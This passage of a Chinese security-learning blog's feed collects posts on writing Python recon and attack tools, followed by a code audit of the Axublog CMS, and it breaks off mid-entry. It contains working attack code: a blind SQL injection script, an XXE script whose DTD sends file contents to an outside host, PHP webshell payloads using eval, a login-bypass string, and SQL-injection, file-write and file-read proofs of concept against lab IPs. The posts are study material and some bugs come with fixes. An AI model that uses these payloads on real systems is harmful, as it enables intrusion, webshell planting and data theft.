rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;SSRF漏洞部分&quot;&gt;&lt;a href=&quot;#SSRF漏洞部分&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞部分&quot;&gt;&lt;/a&gt;SSRF漏洞部分&lt;/h3&gt;&lt;h4 id=&quot;SSRF简述&quot;&gt;&lt;a href=&quot;#SSRF简述&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="SSRF漏洞" scheme="https://shu1l.github.io/tags/SSRF%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>python编写子域名爆破小工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</id>
    <published>2020-04-20T04:42:19.000Z</published>
    <updated>2020-04-28T05:09:06.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p><p>此处有详细介绍，</p><pre><code>https://github.com/asciimoo/exrex</code></pre><p>这个模块的主要功能：</p><ul><li>生成所有匹配的字符串</li><li>生成随机匹配的字符串</li><li>计算匹配字符串的数量</li><li>简化正则表达式</li></ul><p>安装方法：</p><pre><code>pip install exrex</code></pre><p>我们主要使用该模块的generate()方法。</p><ul><li>generate(s,limit=20)</li><li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li><li>参数s:正则表达式</li><li>limit：范围限制，要求limit的类型为整型数</li></ul><h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><pre><code>import exrexweb_dic=&#39;demo&#39;dic_pass=&#39;admin&#39;rule = &#39;{web_dic}[!@#]{dic_pass}&#39;s = rule.format(web_dic=web_dic,dic_pass=dic_pass)dics = list(exrex.generate(s))for i in dics:    print i</code></pre><h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p><pre><code>import exrex  #导入生成字典模块def host_replace(hosts):         #域名处理方法    if &#39;://&#39; in hosts:        hosts = hosts.split(&#39;://&#39;)[1]    if &#39;/&#39; in hosts:         hosts = hosts.replace(&#39;/&#39;,&#39;&#39;)                  hosts = &quot;&quot;.join(hosts)    return hostsdef dic_create(hosts):        #子域名字典生成方法    web_white = [&#39;com&#39;, &#39;cn&#39;, &#39;gov&#39;, &#39;edu&#39;, &#39;org&#39;]    web_dics = hosts.split(&#39;.&#39;)    for web_dic in web_dics:        if web_dic not in web_white:            f_rule = open(&#39;rule.ini&#39;, &#39;r&#39;)            for i in f_rule:                dics = list(exrex.generate(web_dic+i.strip(&#39;\r\n&#39;)))                for dic in dics:                    if len(dic)&gt;3:                        dic_out = open(&#39;mypass.txt&#39;,&#39;a+&#39;)                        dic_out.write(dic+&#39;\r\n&#39;)                        dic_out.close()                        print dic    f_rule.close()def main():       #主函数    hosts = raw_input(&quot;Write Your Hosts :&quot;)    host =host_replace(hosts)    dic_create(host)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p><p>子域名爆破脚本进阶版：</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-import dns.resolverimport threadingimport Queue import optparseimport sys                    queue = Queue.Queue()lock = threading.Lock()class GetSubDomain(threading.Thread):    &quot;&quot;&quot;docstring for SubDomain&quot;&quot;&quot;    def __init__(self, target,queue,outfile):        threading.Thread.__init__(self)        self.target = target        self.queue = queue        self.rsv = dns.resolver.Resolver()        outfile = target + &#39;.txt&#39; if not outfile else outfile        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)        self.ip_list = []    def _scan(self):        while not self.queue.empty():            self.ip_list = []            ips = None            sub_domain = self.queue.get() + &#39;.&#39; + self.target            for _ in range(3):                try:                    answers = self.rsv.query(sub_domain)                    if answers:                        for answer in answers:                            if answer.address not in self.ip_list:                                self.ip_list.append(answer.address)                except dns.resolver.NoNameservers, e:                    break                except Exception, e:                    pass            if len(self.ip_list)&gt;0:                ips = &#39;,&#39;.join(self.ip_list)                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;                lock.acquire()                print msg                self.f.write(msg)                lock.release()            self.queue.task_done()    def run(self):        self._scan()def get_target(domain_list):    targets = []    for line in open(domain_list,&#39;r&#39;):        if line:            targets.append(line.strip())    return targetsdef get_sub_queue(sub_file): #得到所有子域名的queue    for line in open(sub_file,&#39;r&#39;):        if line:            queue.put(line.strip())def main():    parser = optparse.OptionParser()    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60,         type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)    (options, args) = parser.parse_args()    if options.url:        urls = [options.url]    elif options.domain_list:        urls = get_target(options.domain_list)    else:        parser.print_help()        print &quot;Example: &quot;        print &quot;\tpython getsub.py -u baidu.com&quot;        print &quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&quot;        sys.exit(0)    for url in urls:        get_sub_queue(options.sub_file)        for x in xrange(1,options.threads_num+1):            t = GetSubDomain(url,queue,options.outfile)            t.setDaemon(True)            t.start()        queue.join()if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写子域名爆破小工具&quot;&gt;&lt;a href=&quot;#python编写子域名爆破小工具&quot; class=&quot;headerlink&quot; title=&quot;python编写子域名爆破小工具&quot;&gt;&lt;/a&gt;python编写子域名爆破小工具&lt;/h2&gt;&lt;h4 id=&quot;字典生成工具编写&quot;
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写sql注入&amp;xml注入工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</id>
    <published>2020-04-20T04:41:52.000Z</published>
    <updated>2020-04-28T05:03:45.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><pre><code>import requests  #导入request模块url = &#39;http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s&#39;headers = {&#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&#39;}  #定义请求header头check_data=list(&#39;1234567890abcdefghijklmnopqrstuzwxyz@&#39;)  print(&quot;SQL Injection for MySQL!&quot;)l = &quot;&#39; and length(database())=%s and &#39;1&#39;=&#39;1&quot;            #定义注入语句st = &quot;&#39; and substr(database(),%s,1)=&#39;%s&#39;and &#39;1&#39;=&#39;1&quot;     #定义注入语句user = &quot;&quot;for i in range(0,20):    sql = l % str(i)        #payload拼接    judge1 = requests.get(url % sql,headers=headers,timeout=30)    if judge1.content.find(b&quot;You are in...........&quot;) != -1:   #判断页面回显        length = i        print(i)        breakfor k in range(1,i+1):    for ss in check_data:        str_user = st % (str(k),str(ss))        judge2 = requests.get(url % str_user,headers=headers,timeout = 30)        if judge2.content.find(b&quot;You are in...........&quot;) != -1:            user = user + ssprint(user)</code></pre><h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><pre><code>from http.server import HTTPServer,CGIHTTPRequestHandlerimport threadingimport requestsdef web_server():    port = 3344    httpd = HTTPServer((&#39;&#39;,port),CGIHTTPRequestHandler)    print(&quot;[*] Starting simple_httpd on port:&quot;,httpd.server_port)    httpd.serve_forever()def send_data():    files = &#39;C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php&#39;    data = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&lt;!DOCTYPE test [\r\n&lt;!ENTITY % file SYSTEM \&quot;php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\&quot;&gt;\r\n&lt;!ENTITY % dtd SYSTEM \&quot;http://192.168.181.128/evil.xml\&quot; &gt;\r\n%dtd;\r\n%send;\r\n]&gt;&quot;    requests.post(&quot;http://192.168.181.138/xxe-lab-master/php_xxe/&quot;,data=data)    files = input(&quot;Write filename&quot;)if __name__ == &#39;__main__&#39;:    file = open(&#39;evil.xml&#39;,&#39;w&#39;)    file.write(&quot;&lt;!ENTITY % payload \&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;HTTP://192.168.181.128/?content=%file;&#39;&gt;\&quot;&gt; %payload;&quot;)    file.close()    t1 = threading.Thread(target=web_server)    t1.start()    t2 = threading.Thread(target=send_data)    t2.start()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写sql注入-amp-xml注入工具&quot;&gt;&lt;a href=&quot;#python编写sql注入-amp-xml注入工具&quot; class=&quot;headerlink&quot; title=&quot;python编写sql注入&amp;amp;xml注入工具&quot;&gt;&lt;/a&gt;python编写sql
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写简单C段&amp;web目录扫描工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</id>
    <published>2020-04-20T04:41:18.000Z</published>
    <updated>2020-04-28T05:01:43.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><pre><code>import requestsfrom optparse import OptionParserimport threadingfrom Queue import Queueimport sysclass WEB_DIR(threading.Thread):    def __init__(self,queue):            threading.Thread.__init__(self)            self._queue = queue    def run(self):        while not self._queue.empty():            url = self._queue.get()            try:                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}                r = requests.get(url, headers=headers, timeout=1)            except Exception,e:              pass            if r.status_code == 200:                print &#39;[*]&#39; + urldef start(url,file,count):    queue = Queue()    f = open(&#39;%s.txt&#39; % file, &#39;r&#39;)    for i in f:        queue.put(url + i.strip(&#39;\r\n&#39;))    threads = []    thread_count = int(count)    for i in range(thread_count):        threads.append(WEB_DIR(queue))    for t in threads:        t.start()    for t in threads:        t.join()def main():    parser = OptionParser()    parser = OptionParser()    parser.add_option(&quot;-u&quot;,&quot;--url&quot;,dest=&quot;url&quot;,help=&quot;Target url for scan&quot;)    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;, help=&quot;Dir filename&quot;)    parser.add_option(&quot;-t&quot;, &quot;--thread&quot;, dest=&quot;count&quot;,type=int,default=10, help=&quot;scan thread count&quot;)    options,args = parser.parse_args()    if options.url and options.filename:        start(options.url,options.filename,options.count)    else:        parser.print_help()        sys.exit(1)if __name__ == &#39;__main__&#39;:    main()</code></pre><h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><pre><code>import ipaddrimport requestsimport threadingfrom Queue import Queueimport sysclass C_Scan(threading.Thread):    def __init__(self,queue):            threading.Thread.__init__(self)            self._queue = queue    def run(self):        while not self._queue.empty():            r = 0            url = str(self._queue.get())            url = &#39;http://&#39;+url            try:                headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr&#39;}                r = requests.get(url, headers=headers, timeout=1)            except Exception,e:                pass            if r.status_code == 200:                    print &#39;[*]&#39; + urldef main():    if len(sys.argv) != 2:        print &#39;Usage: Python %s 192.168.1.1/24&#39;%(sys.argv[0])    else:        threads = []        threadnum = 250        queue = Queue()        cidrip = sys.argv[1]        ips = ipaddr.IPNetwork(cidrip)        for ip in ips:            queue.put(ip)        for i in xrange(threadnum):            threads.append(C_Scan(queue))        for t in threads:            t.start()        for t in threads:            t.join()        print &quot;All Finished!!!&quot;if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Python编写C段-amp-web目录扫描工具&quot;&gt;&lt;a href=&quot;#Python编写C段-amp-web目录扫描工具&quot; class=&quot;headerlink&quot; title=&quot;Python编写C段&amp;amp;web目录扫描工具&quot;&gt;&lt;/a&gt;Python编写C段&amp;amp
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Thinkphp5框架学习</title>
    <link href="https://shu1l.github.io/2020/04/19/thinkphp5-kuang-jia-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/19/thinkphp5-kuang-jia-xue-xi/</id>
    <published>2020-04-19T12:02:09.000Z</published>
    <updated>2020-04-20T06:01:52.028Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Axublog代码审计学习</title>
    <link href="https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</id>
    <published>2020-04-19T12:00:16.000Z</published>
    <updated>2020-04-28T03:44:06.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p><pre><code>&lt;?phpheader(&quot;Content-type:text/html; charset=utf-8&quot;);require(&quot;cmsconfig.php&quot;);require(&quot;class/c_other.php&quot;);sqlguolv();$g=$_GET[&#39;g&#39;];if ($g==&#39;arthit&#39;){$id=$_GET[&#39;id&#39;];            if($id!=&#39;&#39;){$tab=$tabhead.&quot;arts&quot;;mysql_select_db($tab);$sql=mysql_query(&quot;UPDATE &quot;.$tab.&quot; SET hit=hit+1 where id=&quot;.$id);  //直接将$_GET[&#39;id&#39;]提取的                                                                      id带入sql查询，没有经过                                                                      有效过滤$sql = mysql_query(&quot;select * from &quot;.$tab.&quot; where id=&quot;.$id);$row=mysql_fetch_array($sql);    $str=$row[&#39;hit&#39;];    echo &#39;document.write(&#39;.$str.&#39;);&#39;;    }}</code></pre><p>我们尝试直接传入payload尝试：</p><pre><code>/hit/php?g=archit&amp;id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12</code></pre><p>发现被拦截。</p><p>我们发现在get传参之前，有一个过滤函数。</p><pre><code>if(sqlguolv()==1){die(&#39;禁止输入特殊符号和非法访问！&#39;);}</code></pre><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p><pre><code>Function sqlguolv() {@header(&quot;Content-type:text/html; charset=utf-8&quot;);$a=&#39;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&#39;|\\*|\*|union|into/i&#39;;if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 ){return &quot;1&quot;;}}</code></pre><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p><p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p><p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p><p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p><pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p><pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p><pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p><h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p><h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p><pre><code>&lt;?php@$g=$_GET[&quot;g&quot;];?&gt;&lt;script src=&quot;jspost.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;?php    switch ($g)    {    default:index();break;     case &quot;index&quot;:index();break;     case &quot;savechoose&quot;:savechoose();break;     case &quot;edit&quot;:edit();break;         case &quot;edit2&quot;:edit2();break;         case &quot;edit2save&quot;:edit2save();break;     }</code></pre><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p><p>我们继续观察该函数功能：</p><pre><code>&lt;?php function edit2save(){global $themepath;?&gt;&lt;div class=&quot;yj_green&quot; id=full&gt;&lt;b class=&quot;b1&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b4&quot;&gt;&lt;/b&gt;&lt;div class=&quot;boxcontent&quot;&gt;&lt;h2&gt;&lt;a href=&quot;?&quot;&gt;主题管理&lt;/a&gt; &gt; &lt;a href=&quot;javascript:history.go(-2)&quot;&gt;编辑主题&lt;/a&gt; &gt; 编辑文件 &gt; &lt;a href=&quot;javascript:history.back()&quot;&gt;返回&lt;/a&gt;&lt;/h2&gt;&lt;/div&gt;&lt;div class=&quot;t1&quot;&gt;&lt;div class=&quot;t2&quot;&gt;&lt;?php$path=$_REQUEST[&#39;path&#39;];$content=stripslashes($_REQUEST[&#39;content&#39;]);?&gt;&lt;p&gt;编辑文件：&lt;?=$path?&gt;&lt;/p&gt;&lt;?phpif($path==&#39;&#39;){echo&#39;文件路径错误！&#39;;exit;}if(file_put_contents ($path, $content)){echo&quot;保存文件成功！&quot;;} else{echo&quot;保存文件失败！&quot;;}?&gt;</code></pre><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p><p>我们可以构造写入webshell的payload:</p><pre><code>?g=edit2save&amp;path=../shell.php&amp;content=&lt;?php%20@eval($_POST[cmd]);?&gt;</code></pre><p>成功拿到webshell.</p><h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p><p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p><pre><code>if($path!=&#39;../theme/default/about.mb&#39;){    echo &#39;about.mb地址不正确&#39;;    exit;}</code></pre><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p><h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();include($mb);$html = ob_get_contents ();ob_clean();$html=mbreplace($html);file_put_contents ($cache, $html);echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#39;&quot;&gt;访问&lt;/a&gt;&#39;;?&gt;&lt;/div&gt;&lt;/div&gt;&lt;b class=&quot;b4b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b1b&quot;&gt;&lt;/b&gt;&lt;/div&gt;&lt;?php}?&gt;</code></pre><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p><p>我们在about.mb尾部添加如下代码：</p><pre><code>&lt;?php file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); ?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p><h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p><p><img src="1587018-20200303210401433-2074327058.png" alt=""></p><p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p><p><img src="1587018-20200303211200124-595595133%5B1%5D.png" alt=""></p><h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p><pre><code>user:admin&#39; or 1=1#psw: 随意或者user: admin&#39; or 1#psw: 随意</code></pre><p><img src="1587018-20200303211645255-577074129%5B1%5D.png" alt=""></p><h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p><p><img src="1587018-20200303232615102-565416911%5B1%5D.png" alt=""></p><p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p><p><img src="1587018-20200303234054140-229902481%5B1%5D.png" alt=""></p><p><img src="1587018-20200303233948167-467235758%5B1%5D.png" alt=""></p><p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p><p><img src="1587018-20200303234320733-213715566%5B1%5D.png" alt=""></p><h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="1587018-20200303234506377-737313316.png" alt="img"></p><h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p><p><img src="1587018-20200303234835707-2141296773.png" alt="img"></p><p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p><p>漏洞利用：</p><pre><code>执行如下poc时候返回正确结果：http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+执行如下poc时候无结果返回：http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p><p>漏洞点：admin/theme.php</p><p><img src="1587018-20200304002821492-309441952.png" alt=""></p><p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p><p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p><p><img src="1587018-20200304003116729-1307171520.png" alt="img"></p><h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>请求：http://192.168.110.152/axublog/admin/theme.php?g=edit2savepost:path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="1587018-20200304003256803-1334544380.png" alt="img"></p><h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p><p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p><p><img src="1587018-20200304172222897-1426655107.png" alt="img"></p><p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p><p><img src="1587018-20200304172533350-1121177041.png" alt="img"></p><p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p><p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p><p><img src="1587018-20200304172752867-937007122.png" alt="img"></p><h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>poc:http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+Referer: 任意填写</code></pre><p><img src="1587018-20200304172922428-724640530.png" alt="img"></p><p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p><h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p><p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p><p><img src="1587018-20200304173840167-1365630191.png" alt="img"></p><p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p><p><img src="1587018-20200304174437952-1224821444.png" alt="img"></p><p>漏洞利用：</p><pre><code>poc:http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><p><img src="1587018-20200304174618584-506013891.png" alt=""></p><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" 